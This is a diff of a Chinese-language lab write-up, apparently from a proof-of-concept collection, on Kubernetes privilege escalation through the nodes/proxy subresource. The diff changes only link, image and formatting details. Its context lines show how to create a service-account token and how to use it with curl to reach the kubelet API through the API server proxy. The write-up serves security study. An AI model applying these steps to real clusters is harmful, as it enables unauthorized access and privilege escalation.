@@ -6,12 +6,12 @@
 
 参考链接：
 
-- https://blog.aquasec.com/privilege-escalation-kubernetes-rbac
-- https://github.com/Metarget/metarget/tree/master/writeups_cnv/config-k8s-node-proxy
+* https://blog.aquasec.com/privilege-escalation-kubernetes-rbac
+* https://github.com/Metarget/metarget/tree/master/writeups\_cnv/config-k8s-node-proxy
 
 ## 环境搭建
 
-基础环境准备（Docker + Minikube + Kubernetes），可参考 [Kubernetes + Ubuntu 18.04 漏洞环境搭建](https://github.com/Threekiii/Awesome-POC/blob/master/%E4%BA%91%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/Kubernetes%20%2B%20Ubuntu%2018.04%20%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.md) 完成。
+基础环境准备（Docker + Minikube + Kubernetes），可参考 [Kubernetes + Ubuntu 18.04 漏洞环境搭建](<Kubernetes + Ubuntu 18.04 漏洞环境搭建.md>) 完成。
 
 本例中各组件版本如下：
 
@@ -38,11 +38,11 @@ NAME             READY   STATUS    RESTARTS   AGE
 k8s-node-proxy   1/1     Running   0          78s
 ```
 
-![](images/Kubernetes%20利用%20nodes%20proxy%20子资源进行权限提升/image-20250422161359275.png)
+![](../.gitbook/assets/image-20250422161359275.png)
 
 ## 漏洞复现
 
->  Kubernetes v1.24 及以上版本，默认不再自动创建长期存储的 Token Secret，即不再创建 `<serviceaccount>-token-xxxxx`。
+> Kubernetes v1.24 及以上版本，默认不再自动创建长期存储的 Token Secret，即不再创建 `<serviceaccount>-token-xxxxx`。
 
 为了复现当前场景，我们可以手动为 `ServiceAccount` 创建一个 secret（注意，在实际环境中，该方式存在风险）：
 
@@ -71,7 +71,7 @@ NAME             SECRETS   AGE
 k8s-node-proxy   1         18m
 ```
 
-![](images/Kubernetes%20利用%20nodes%20proxy%20子资源进行权限提升/image-20250422173756548.png)
+![](../.gitbook/assets/image-20250422173756548.png)
 
 至此，secrets 问题已经解决完毕，我们开始复现漏洞。获取 Token 值并导入：
 
@@ -82,7 +82,7 @@ kubectl get secrets k8s-node-proxy-token-secret -n metarget -o jsonpath={.data.t
 export TOKEN=<YOUR_TOKEN>
 ```
 
-![](images/Kubernetes%20利用%20nodes%20proxy%20子资源进行权限提升/image-20250422173949715.png)
+![](../.gitbook/assets/image-20250422173949715.png)
 
 可以看到，虽然我们无法直接通过 `/api/v1/namespaces/<namespace>/pods/` 列出 pods，但是可以通过具有 `nodes/proxy` 权限的 Token 间接访问 kubelet API，例如 `/api/v1/nodes/<node>/proxy/pods`。
 
@@ -91,14 +91,14 @@ export TOKEN=<YOUR_TOKEN>
 curl -k -H "Authorization: Bearer $TOKEN" https://192.168.49.2:8443/api/v1/namespaces/metarget/pods/
 ```
 
-![](images/Kubernetes%20利用%20nodes%20proxy%20子资源进行权限提升/image-20250422174530583.png)
+![](../.gitbook/assets/image-20250422174530583.png)
 
 ```
 # 发起请求，返回200
 curl -k -H "Authorization: Bearer $TOKEN" https://192.168.49.2:8443/api/v1/nodes/minikube/proxy/pods
 ```
 
-![](images/Kubernetes%20利用%20nodes%20proxy%20子资源进行权限提升/image-20250422174957211.png)
+![](../.gitbook/assets/image-20250422174957211.png)
 
 ```shell
 # payload in https://blog.aquasec.com/privilege-escalation-kubernetes-rbac
@@ -125,7 +125,7 @@ kubectl delete -f k8s_node_proxy.yaml
 
 ## YAML
 
-[k8s_metarget_namespace.yaml](https://github.com/Metarget/metarget/blob/master/yamls/k8s_metarget_namespace.yaml)
+[k8s\_metarget\_namespace.yaml](https://github.com/Metarget/metarget/blob/master/yamls/k8s_metarget_namespace.yaml)
 
 ```
 apiVersion: v1
@@ -134,7 +134,7 @@ metadata:
   name: metarget
 ```
 
-[k8s_node_proxy.yaml](https://github.com/Metarget/metarget/blob/master/vulns_cn/configs/pods/k8s_node_proxy.yaml)
+[k8s\_node\_proxy.yaml](https://github.com/Metarget/metarget/blob/master/vulns_cn/configs/pods/k8s_node_proxy.yaml)
 
 ```
 apiVersion: v1
@@ -185,7 +185,7 @@ spec:
     args: [ "while true; do sleep 30; done;" ]
 ```
 
-k8s_node_proxy_token.yaml
+k8s\_node\_proxy\_token.yaml
 
 ```
 apiVersion: v1
